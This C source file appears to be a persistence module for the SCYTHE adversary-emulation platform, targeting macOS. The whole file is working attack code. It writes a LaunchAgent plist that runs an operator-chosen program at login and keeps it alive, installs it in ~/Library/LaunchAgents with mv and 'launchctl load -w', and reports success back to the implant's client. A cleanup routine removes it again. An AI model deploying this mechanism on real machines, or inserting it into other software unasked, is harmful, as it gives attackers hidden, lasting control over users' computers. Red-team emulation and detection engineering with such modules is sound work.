/*++

 Copyright (c) SCYTHE, Inc. Use is subject to agreement.

 --*/
#define _GNU_SOURCE
#include "common.h"

PSCYTHE_CLIENT g_pClient = NULL;

char *filepath = "";
char *filename1 = "~/Library/LaunchAgents/com.scythe.persist.plist";
char *filename0 = "/tmp/com.scythe.persist.plist";

char* writeToFile();

// {7de51670-850c-11ec-8b81-ff73e7ff5af6}
static const GUID persistModuleId =
{ 0x7de51670, 0x850c, 0x11ec, { 0x8b, 0x81, 0xff, 0x73, 0xe7, 0xff, 0x5a, 0xf6}};

static const SCYTHE_MODULE_TYPE persistModuleType = CATEGORY_WORKER;

INT init(PSCYTHE_CLIENT pClient, PVOID pvReserved)
{
    g_pClient = pClient;
        
    return SCYTHE_NOERROR;
}

ERROR_T run(PSCYTHE_MESSAGE pMessage, PVOID pvReserved)
{
    ERROR_T status = SCYTHE_NOERROR;

    filepath = (char*) pMessage->Message;
    
    const char *resp = writeToFile();

    status = g_pClient->PostToMessagingSubsystem(pMessage->MessageId, 0, 0,
            CATEGORY_OUTPUT_COMMUNICATION,
            &persistModuleId,
            NULL,
            strlen(resp), (PBYTE)resp);
    

    return status;
}

ERROR_T getinfo(PSCYTHE_MODULE_INFORMATION pInformation)
{
    ERROR_T status = SCYTHE_ERROR_INVALID_PARAMETER;

    if (NULL != pInformation)
    {
        if (pInformation->cbSize >= sizeof(SCYTHE_MODULE_INFORMATION))
        {
            pInformation->ModuleVersion.wMajor = 1;
            pInformation->ModuleVersion.wMinor = 0;
            pInformation->ModuleType = persistModuleType;
            memcpy(&(pInformation->ModuleId), &persistModuleId, sizeof(GUID));
            status = SCYTHE_NOERROR;
        }
    }

    return status;
}

// Required function: deinit
ERROR_T deinit(PVOID pvReserved)
{
    char *command0 = "/bin/launchctl remove com.scythe.persist";
    char *command1;
    asprintf(&command1,"/bin/rm -f %s",filename1);
    system(command1);
    system(command0);
    return SCYTHE_NOERROR;
}

char* writeToFile(){
    char *command0;
    char *command1;

    char *plist;
    FILE *fp;
    int status;
    
    asprintf(&plist,"<?xml version='1.0' encoding='UTF-8'?>\n"
    "<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n"
    "<plist version='1.0'>\n"
    "<dict>\n"
    "<key>Label</key>\n"
    "<string>com.scythe.persist</string>\n"
    "<key>ProgramArguments</key>\n"
    "<array>\n"
    "<string>%s</string>\n"
    "</array>\n"
    "<key>RunAtLoad</key>\n"
    "<true/>\n"
    "<key>KeepAlive</key>\n"
    "<true/>\n"
    "</dict>\n"
    "</plist>\n",filepath);
    
    fp  = fopen(filename0,"w");
    if (fp == NULL) {
        perror("File could not be wrtten.");
        return "Error: File could not be written to";
    }
    asprintf(&command0,"/bin/mv %s %s",filename0, filename1);
    asprintf(&command1,"/bin/launchctl load -w %s",filename1); 
    fprintf(fp,"%s",plist);
    fclose(fp);

    status = system(command0);
    if (status != 0){
        return "Error: mv failed.";
    }    
    status = system(command1);
    if (status != 0){
        return "Error: launchctl load failed.";
    }
    char *resp;
    asprintf(&resp,"Persistence successful. Persisting under %s. Running: %s", filename1,filepath);
    return resp;
}